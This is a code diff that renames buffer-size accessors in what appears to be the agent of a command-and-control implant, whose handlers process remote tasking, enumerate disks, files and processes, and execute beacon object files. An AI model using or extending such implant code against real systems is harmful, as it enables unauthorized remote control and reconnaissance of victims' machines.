@@ -15,7 +15,7 @@ void Commander::ProcessCommandTasks(BYTE* recv, ULONG recvSize, Packer* outPacke
 	*inPacker = Packer( recv, recvSize );
 
 	ULONG packerSize = inPacker->Unpack32();
-	while ( packerSize + 4 > inPacker->GetDataSize())
+	while ( packerSize + 4 > inPacker->datasize())
 	{	
 		ULONG CommandId = inPacker->Unpack32();
 		switch ( CommandId )
@@ -216,7 +216,7 @@ void Commander::CmdDisks(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack8(TRUE);
 		
 		ULONG count = 0;
-		ULONG indexCount = outPacker->GetDataSize();
+		ULONG indexCount = outPacker->datasize();
 		outPacker->Pack32(0);
 
 		for (char drive = 'A'; drive <= 'Z'; ++drive) {
@@ -305,8 +305,8 @@ void Commander::CmdExecBof(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	ULONG taskId    = inPacker->Unpack32();
 
 	Packer* bofPacker = ObjectExecute(taskId, (CHAR*)entry, bof, bofSize, args, argsSize);
-	if (bofPacker->GetDataSize() > 8)
-		outPacker->PackFlatBytes(bofPacker->GetData(), bofPacker->GetDataSize());
+	if (bofPacker->datasize() > 8)
+		outPacker->PackFlatBytes(bofPacker->data(), bofPacker->datasize());
 
 	outPacker->Pack32(taskId);
 	outPacker->Pack32(commandId);
@@ -428,7 +428,7 @@ void Commander::CmdLs(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->PackStringA(fullpath);
 
 		ULONG count = 0;
-		ULONG indexCount = outPacker->GetDataSize();
+		ULONG indexCount = outPacker->datasize();
 		outPacker->Pack32(0);
 
 		do {
@@ -555,7 +555,7 @@ void Commander::CmdPsList(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	if (NT_SUCCESS(NtStatus)) {
 		outPacker->Pack8(TRUE);
 		ULONG count = 0;
-		ULONG indexCount = outPacker->GetDataSize();
+		ULONG indexCount = outPacker->datasize();
 		outPacker->Pack32(0);
 
 		DWORD accessMask = 0;
